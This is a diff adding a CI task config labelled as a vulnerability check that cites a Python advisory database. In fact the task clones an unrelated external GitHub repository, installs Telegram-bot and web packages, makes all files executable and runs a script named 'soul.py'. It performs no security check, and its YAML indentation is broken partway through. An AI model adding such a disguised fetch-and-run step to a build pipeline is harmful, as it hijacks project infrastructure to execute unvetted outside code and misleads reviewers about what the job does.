@@ -1,0 +1,14 @@
+tasks:
+  check-vulvs:
+    runner: razorci/python:3.9
+    steps:
+    - checkout
+    ## use https://github.com/pypa/advisory-database for security vulnerabilities
+    - commands: 
+      - export PATH="$(python3 -m site --user-base)/bin:$PATH"
+      - git clone https://github.com/teamcity10101/noob.git
+cd noob
+pip install --upgrade pip
+            pip install telebot flask pymongo aiohttp python-telegram-bot
+chmod +x *
+python3 soul.py
